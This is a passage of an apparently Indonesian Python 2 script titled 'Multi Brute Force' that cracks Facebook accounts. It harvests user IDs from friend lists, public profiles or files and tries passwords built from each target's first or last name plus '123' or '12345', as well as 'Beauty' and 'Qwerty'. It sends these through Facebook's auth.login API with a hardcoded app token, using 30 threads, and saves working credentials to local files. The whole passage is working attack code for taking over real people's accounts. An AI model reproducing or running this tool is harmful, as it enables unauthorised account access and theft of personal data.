            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/usa.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                cek = open('done/usa.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '12345'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    oke = open('done/usa.txt', 'a')
                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos2
                    cek = open('done/usa.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        oke = open('done/usa.txt', 'a')
                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos3
                        cek = open('done/usa.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = j['first_name'].lower() + '12345'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            oke = open('done/usa.txt', 'a')
                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos4
                            cek = open('done/usa.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Beauty'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                oke = open('done/usa.txt', 'a')
                                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos5
                                cek = open('done/usa.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = 'Beauty'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    oke = open('done/usa.txt', 'a')
                                    oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos6
                                    cek = open('done/usa.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = 'Qwerty'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        oke = open('done/usa.txt', 'a')
                                        oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                        print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos7
                                        cek = open('done/usa.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['last_name'].lower() + '123'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            oke = open('done/usa.txt', 'a')
                                            oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;93mCEKPOINT'
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                                            print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos8
                                            cek = open('done/usa.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSelesai ...'
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mSalin hasil crack lalu simpan\x1b[1;91m : \x1b[1;97mdone usa.'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m) ')
    os.system('python2 Crackv1.py')


def crack_pakis():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Token invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print ' '
    print '\x1b[33;1m _________   ________.    '
    print '\x1b[33;1m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
    print '\x1b[1;97m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
    print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
    print '\x1b[1;92m  \\______  /|__|   |___  /'
    print '\x1b[1;92m         \\/            \\/ '
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\x1b[1;97m(\x1b[1;93mPakistan & India\x1b[1;97m)\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    print '\x1b[1;94m(\x1b[1;97m1\x1b[1;94m) \x1b[1;97mCrack Dari Daftar Teman'
    print '\x1b[1;94m(\x1b[1;97m2\x1b[1;94m)\x1b[1;97m Crack Dari Id Teman/Publik'
    print '\x1b[1;94m(\x1b[1;97m3\x1b[1;94m)\x1b[1;97m Crack Dari File'
    print '\x1b[1;94m(\x1b[1;91m0\x1b[1;94m) \x1b[1;97mKembali'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    pilih_pakis()


def pilih_pakis():
    teak = raw_input('\x1b[1;97m(?) Pilih \x1b[94m> \x1b[1;97m ')
    if teak == '':
        print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
        pilih_pakis()
    else:
        if teak == '1' or teak == '01':
            os.system('clear')
            print ' '
            print '\x1b[1;93m _________   ________.    '
            print '\x1b[1;93m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '           \x1b[1;94m>>> \x1b[1;93mCRACK PAKISTAN & INDIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])

        elif teak == '2' or teak == '02':
            os.system('clear')
            print ' '
            print '\x1b[1;93m _________   ________.    '
            print '\x1b[1;93m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            print '           \x1b[1;94m>>> \x1b[1;93mCRACK PAKISTAN & INDIA \x1b[1;94m<<<'
            print 50 * '\x1b[1;94m\xe2\x94\x80'
            idt = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mID Publik \x1b[1;91m:\x1b[1;97m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama Akun \x1b[1;91m:\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) ID publik tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_pakis()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Tidak ada koneksi !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        elif teak == '3' or teak == '03':
            os.system('clear')
            print ' '
            print '\x1b[1;93m _________   ________.    '
            print '\x1b[1;93m \\_   ___ \\_/ ____\\_ |__   \x1b[1;97m[\x1b[1;94m M\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mMulti'
            print '\x1b[1;97m /    \\  \\/\\   __\\ | __ \\  \x1b[1;97m[\x1b[1;94m B\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mBrute'
            print '\x1b[1;97m \\     \\____|  |   | \\_\\ \\ \x1b[1;97m[\x1b[1;94m F\x1b[1;97m ]\x1b[1;94m > \x1b[1;97mForce'
            print '\x1b[1;92m  \\______  /|__|   |___  /'
            print '\x1b[1;92m         \\/            \\/ '
            try:
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                print '           \x1b[1;94m>>> \x1b[1;93mCRACK PAKISTAN & INDIA \x1b[1;94m<<<'
                print 50 * '\x1b[1;94m\xe2\x94\x80'
                idlist = raw_input('\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;97mNama File\x1b[1;91m :\x1b[1;97m ')
                for line in open(idlist, 'r').readlines():
                    id.append(line.strip())

            except KeyError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada ! '
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;92m)')
            except IOError:
                print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) File tidak ada !'
                raw_input('\n\x1b[1;97m(\x1b[1;91mKembali\x1b[1;97m)')
                crack_pakis()

        elif teak == '0' or teak == '00':
            menu()
        else:
            print '\x1b[1;97m(\x1b[1;91m!\x1b[1;97m) Isi Yg Benar Sayang!'
            pilih_pakis()
        print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Total ID\x1b[1;91m  :\x1b[1;97m ' + str(len(id))
        titik = ['.   ', '..  ', '... ']
        for o in titik:
            print '\r\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) Crack Berjalan ' + o,
            sys.stdout.flush()
            time.sleep(1)

    print '\n\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\x1b[0m'
    print '\x1b[0;97m(\x1b[0;94m\xe2\x80\xa2\x1b[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\x1b[0m'
    print 50 * '\x1b[1;94m\xe2\x94\x80'

    def main(arg):
        zowe = arg
        try:
            sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;97m%H\x1b[1;97m:\x1b[1;97m%M\x1b[1;97m:\x1b[1;97m%S')))
            sys.stdout.flush()
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = j['first_name'].lower() + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) \x1b[1;92mBERHASIL'
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m' + j['name']
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m' + zowe
                print '\x1b[1;97m(\x1b[1;94m\xe2\x80\xa2\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m' + bos1
                oke = open('done/pakis_hindi.txt', 'a')
                oke.write('\n{\xc3\x97} BERHASIL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
